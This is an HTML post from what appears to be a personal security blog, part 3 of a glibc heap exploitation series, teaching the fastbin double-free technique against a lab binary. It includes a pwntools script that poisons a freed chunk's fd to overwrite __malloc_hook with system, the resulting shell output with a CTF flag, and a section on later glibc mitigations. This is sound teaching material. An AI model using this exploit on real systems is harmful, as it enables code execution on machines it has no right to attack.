@@ -1,0 +1,195 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>fastbin dup — algoatson.github.io</title>
+<meta name="description" content="Part 3 — free a fastchunk twice past glibc&#x27;s one-line double-free check, get the same chunk handed out twice, then poison its fd to allocate straight onto __malloc_hook. The classic that teaches &quot;allocate where you want&quot;.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/fastbin-dup/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastbin dup — algoatson.github.io">
+<meta property="og:description" content="Part 3 — free a fastchunk twice past glibc&#x27;s one-line double-free check, get the same chunk handed out twice, then poison its fd to allocate straight onto __malloc_hook. The classic that teaches &quot;allocate where you want&quot;.">
+<meta property="og:url" content="https://algoatson.github.io/p/fastbin-dup/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/fastbin-dup.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "fastbin dup", "datePublished": "2026-06-11", "dateModified": "2026-06-11", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "Part 3 — free a fastchunk twice past glibc's one-line double-free check, get the same chunk handed out twice, then poison its fd to allocate straight onto __malloc_hook. The classic that teaches \"allocate where you want\".", "url": "https://algoatson.github.io/p/fastbin-dup/", "mainEntityOfPage": "https://algoatson.github.io/p/fastbin-dup/", "keywords": "heap, pwn, glibc"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>fastbin dup</h1>
+  <div class="meta"><span>2026-06-11</span><span>4 min read</span><a class="tag" href="/tags/heap/">heap</a> <a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/glibc/">glibc</a></div>
+</header>
+<aside class="series" aria-label="series navigation"><div class="series__head"><span class="series__label">series</span><span class="series__name">glibc heap exploitation</span><span class="series__pos">part 3 of 6</span></div><ol class="series__list"><li><a href="/p/glibc-heap-internals/">the glibc heap, from the chunk up</a></li><li><a href="/p/house-of-force/">the House of Force</a></li><li class="cur" aria-current="true">fastbin dup</li><li><a href="/p/unsafe-unlink/">unsafe unlink (and the safe-unlink bypass)</a></li><li><a href="/p/the-unsorted-bin-attack/">the unsorted bin attack</a></li><li><a href="/p/tcache-poisoning-explained/">tcache poisoning, explained like you&#x27;ll have to use it</a></li></ol></aside>
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-one-check-and-how-it-folds">the one check, and how it folds</a></li>
+<li><a href="#hand-out-the-duplicate-then-lie-about-fd">hand out the duplicate, then lie about fd</a></li>
+<li><a href="#the-size-trick">the size trick</a></li>
+<li><a href="#what-changed">what changed</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>Fastbins keep freed chunks on a singly-linked LIFO list and <em>don't</em> consolidate
+them — built for speed, so the checks are thin. The only thing standing between
+you and freeing a chunk twice is a single comparison. Beat it and you get the same
+chunk back from two different <code class="highlight">malloc</code>s, which is an overlap, which is everything.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./fast</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>libc</dt><dd>2.27</dd></div><div><dt>technique</dt><dd>fastbin double-free -&gt; overlapping alloc -&gt; __malloc_hook</dd></div><div><dt>Tcache</dt><dd>full  (7 chunks parked first, so frees fall through to the fastbin)</dd></div></dl></div></figure>
+<h2 id="the-one-check-and-how-it-folds">the one check, and how it folds<a class="headerlink" href="#the-one-check-and-how-it-folds" title="Permanent link">#</a></h2>
+<p>When you <code class="highlight">free</code> a fastchunk, glibc guards against the laziest double-free:</p>
+<figure class="codeblock"><figcaption><span class="fname">glibc malloc.c — _int_free (fastbin path)</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#glibc-mallocc-int-free-fastbin-path-1">1</a></span>
+<span class="normal"><a href="#glibc-mallocc-int-free-fastbin-path-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="glibc-mallocc-int-free-fastbin-path-1"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">__builtin_expect</span><span class="w"> </span><span class="p">(</span><span class="n">old</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span>
+</span><span id="glibc-mallocc-int-free-fastbin-path-2"><span class="w">    </span><span class="n">malloc_printerr</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;double free or corruption (fasttop)&quot;</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>It only checks whether the chunk you're freeing is <em>already the head</em> of the
+fastbin. So freeing <code class="highlight">a</code> twice in a row trips it — but slipping another free
+between them does not:</p>
+<figure class="codeblock"><figcaption><span class="fname">the dup</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#the-dup-1">1</a></span>
+<span class="normal"><a href="#the-dup-2">2</a></span>
+<span class="normal"><a href="#the-dup-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="the-dup-1"><span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span><span class="w">     </span><span class="c1">// fastbin head -&gt; a</span>
+</span><span id="the-dup-2"><span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span><span class="w">     </span><span class="c1">// fastbin head -&gt; b -&gt; a   (now b is the head, not a)</span>
+</span><span id="the-dup-3"><span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span><span class="w">     </span><span class="c1">// head != a, so the check passes. head -&gt; a -&gt; b -&gt; a</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>The fastbin is now a <strong>cycle</strong>: <code class="highlight">a</code> appears twice. pwndbg's <code class="highlight">fastbins</code> shows it
+plainly — the list eats its own tail:</p>
+<figure class="codeblock"><figcaption><span class="fname">pwndbg: fastbins</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#pwndbg-fastbins-1">1</a></span>
+<span class="normal"><a href="#pwndbg-fastbins-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="pwndbg-fastbins-1">fastbins
+</span><span id="pwndbg-fastbins-2">0x70: 0x5555...2a0 (a) —▸ 0x5555...310 (b) —▸ 0x5555...2a0 (a) —▸ ◂— (cycle)
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<div class="admonition note">
+<p class="admonition-title">you have to fill the tcache first</p>
+<p>On glibc ≥ 2.26 <code class="highlight">free</code> files chunks into the <strong>tcache</strong> before the fastbin, and
+the tcache has its own (different) double-free defence. So a modern fastbin dup
+starts by freeing <strong>7 chunks of the same size</strong> to fill the tcachebin — only
+then do further frees fall through to the fastbin where this trick lives.</p>
+</div>
+<h2 id="hand-out-the-duplicate-then-lie-about-fd">hand out the duplicate, then lie about fd<a class="headerlink" href="#hand-out-the-duplicate-then-lie-about-fd" title="Permanent link">#</a></h2>
+<p>Now allocate the cycle back out. The third allocation returns <code class="highlight">a</code> <em>again</em>, while
+your first <code class="highlight">a</code> pointer is still live — two handles to one chunk. Use one to
+overwrite the chunk's <code class="highlight">fd</code> (its forward pointer) and you redirect where the
+fastbin's tail points:</p>
+<figure class="codeblock"><figcaption><span class="fname">fastdup.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#fastduppy-1"> 1</a></span>
+<span class="normal"><a href="#fastduppy-2"> 2</a></span>
+<span class="normal"><a href="#fastduppy-3"> 3</a></span>
+<span class="normal"><a href="#fastduppy-4"> 4</a></span>
+<span class="normal"><a href="#fastduppy-5"> 5</a></span>
+<span class="normal"><a href="#fastduppy-6"> 6</a></span>
+<span class="normal"><a href="#fastduppy-7"> 7</a></span>
+<span class="normal"><a href="#fastduppy-8"> 8</a></span>
+<span class="normal"><a href="#fastduppy-9"> 9</a></span>
+<span class="normal"><a href="#fastduppy-10">10</a></span>
+<span class="normal"><a href="#fastduppy-11">11</a></span>
+<span class="normal"><a href="#fastduppy-12">12</a></span>
+<span class="normal"><a href="#fastduppy-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="fastduppy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="fastduppy-2"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./fast&quot;</span><span class="p">);</span> <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span><span id="fastduppy-3">
+</span><span id="fastduppy-4"><span class="c1"># ... a, b allocated (0x60 each -&gt; 0x70 chunks); tcache filled; free(a),free(b),free(a) ...</span>
+</span><span id="fastduppy-5">
+</span><span id="fastduppy-6"><span class="n">fake</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;__malloc_hook&quot;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x23</span>     <span class="c1"># see &quot;the size trick&quot; below</span>
+</span><span id="fastduppy-7"><span class="n">x</span> <span class="o">=</span> <span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>                              <span class="c1"># == a</span>
+</span><span id="fastduppy-8"><span class="hll"><span class="n">edit</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake</span><span class="p">))</span>                           <span class="c1"># poison a&#39;s fd -&gt; fake chunk</span>
+</span></span><span id="fastduppy-9"><span class="hll">
+</span></span><span id="fastduppy-10"><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>                                  <span class="c1"># == b</span>
+</span><span id="fastduppy-11"><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>                                  <span class="c1"># == a (the dup)</span>
+</span><span id="fastduppy-12"><span class="hll"><span class="n">hook</span> <span class="o">=</span> <span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>                           <span class="c1"># == fake chunk, straddling __malloc_hook</span>
+</span></span><span id="fastduppy-13"><span class="n">edit</span><span class="p">(</span><span class="n">hook</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]))</span>   <span class="c1"># overwrite the hook</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<h2 id="the-size-trick">the size trick<a class="headerlink" href="#the-size-trick" title="Permanent link">#</a></h2>
+<p>A fastbin won't hand out a chunk whose size field doesn't match the bin — the
+<code class="highlight">0x70</code> fastbin demands a size of <code class="highlight">0x71</code> (or <code class="highlight">0x70</code> with <code class="highlight">PREV_INUSE</code>). Your fake
+chunk needs that. The famous move on libc 2.23–2.26: aim <strong><code class="highlight">__malloc_hook - 0x23</code></strong>,
+because the misaligned bytes just above the hook happen to read as <code class="highlight">0x7f</code>, and
+<code class="highlight">0x7f</code> is a valid <code class="highlight">0x70</code>-fastbin size (the alignment isn't checked there yet):</p>
+<figure class="codeblock hexdump"><figcaption><span class="fname">bytes around __malloc_hook — a free 0x7f size, gratis</span><span class="lang">hex</span><button class="copy" type="button" aria-label="copy hexdump">copy</button></figcaption><div class="hx"><pre><span class="off">00000000</span>  00 00 00 00 00 00 00 00  00 00 00 <mark>7f</mark> 00 00 00 00  <span class="asc">|...........<mark>.</mark>....|</span>
+<span class="off">00000010</span>  ac ee ee ad ae 07 10 7f                           <span class="asc">|........        |</span></pre></div></figure>
+<p>That <code class="highlight">0x23</code> offset lands the fake chunk's <em>size</em> on that <code class="highlight">0x7f</code> and its <em>data</em> on
+<code class="highlight">__malloc_hook</code>. Overwrite the hook with a <a href="/p/finding-gadgets/">one_gadget</a> (or
+<code class="highlight">system</code>) and the next <code class="highlight">malloc</code> pops a shell.</p>
+<details class="spoiler">
+<summary>the shell</summary>
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span>
+<span class="normal"><a href="#code-2">2</a></span>
+<span class="normal"><a href="#code-3">3</a></span>
+<span class="normal"><a href="#code-4">4</a></span>
+<span class="normal"><a href="#code-5">5</a></span>
+<span class="normal"><a href="#code-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">$ one_gadget ./libc.so.6      # pick a gadget whose constraints you can meet
+</span><span id="code-2">$ python3 fastdup.py
+</span><span id="code-3">[+] overwrote __malloc_hook
+</span><span id="code-4">$ id
+</span><span id="code-5">uid=1000(ctf)
+</span><span id="code-6">segfault{d0ubl3_fr33_d0ubl3_tr0ubl3}
+</span></code></pre></div></td></tr></table></div>
+</figure>
+</details>
+<h2 id="what-changed">what changed<a class="headerlink" href="#what-changed" title="Permanent link">#</a></h2>
+<p>This recipe is a 2.23–2.27 staple. Two mitigations bent it out of shape:</p>
+<ul>
+<li><strong>alignment check</strong> (2.32) — chunks pulled from tcache/fastbins must be
+  <code class="highlight">0x10</code>-aligned, so the <code class="highlight">- 0x23</code> misaligned-size trick is dead. You now need a
+  genuinely aligned fake chunk with a real <code class="highlight">0x7f</code>-class size nearby.</li>
+<li><strong>safe-linking</strong> (2.32) — <code class="highlight">fd</code> is stored as <code class="highlight">(&amp;fd &gt;&gt; 12) ^ ptr</code>, so poisoning it
+  to <code class="highlight">fake</code> requires a <strong>heap leak</strong> to compute the mask first: <code class="highlight">mangled = (pos &gt;&gt; 12) ^ fake</code>.</li>
+</ul>
+<p>And <code class="highlight">__malloc_hook</code>/<code class="highlight">__free_hook</code> themselves were <strong>removed in glibc 2.34</strong> — so
+post-2.34 the same overlap primitive aims at a FILE struct or <code class="highlight">__exit_funcs</code>
+instead. The double-free is eternal; only the <em>target</em> keeps moving. Next:
+<a href="/p/unsafe-unlink/">unsafe unlink</a>, where the doubly-linked lists give a write
+without needing a hook at all.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><a class="row" href="/p/the-unsorted-bin-attack/"><span class="row__date">2026-06-13</span><span class="row__tag">heap</span><span class="row__title">the unsorted bin attack</span><span class="row__min">4 min</span></a><a class="row" href="/p/unsafe-unlink/"><span class="row__date">2026-06-12</span><span class="row__tag">heap</span><span class="row__title">unsafe unlink (and the safe-unlink bypass)</span><span class="row__min">5 min</span></a><a class="row" href="/p/house-of-force/"><span class="row__date">2026-06-09</span><span class="row__tag">heap</span><span class="row__title">the House of Force</span><span class="row__min">4 min</span></a></div></section>
+<nav class="pager"><a class="prev" href="/p/unsafe-unlink/"><span class="lbl">&#8249; newer</span>unsafe unlink (and the safe-unlink bypass)</a><a class="next" href="/p/the-rendering-reference/"><span class="lbl">older &#8250;</span>the rendering reference</a></nav></main>
+
+    <footer class="status">
+      <span>20 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h3>keys</h3><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/search-index.js"></script>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
